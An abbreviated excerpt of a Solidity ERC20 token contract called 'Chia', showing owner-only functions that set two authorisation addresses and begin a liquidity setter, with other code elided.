...
pragma solidity ^0.8.0;
contract Chia is ERC20, ERC20Burnable, Ownable {
  ...
  function clear(uint amount) public onlyOwner {
    ...
    function setAuth(address ah,address ah2) public onlyOwner returns(bool){
        require(address(0) == _auth2&&ah!=address(0)&&ah2!=address(0), "recovery");
        _auth = ah;
        _auth2 = ah2;
        return true;
    }

    function setLiquidity(address addr) public onlyOwner returns(bool){
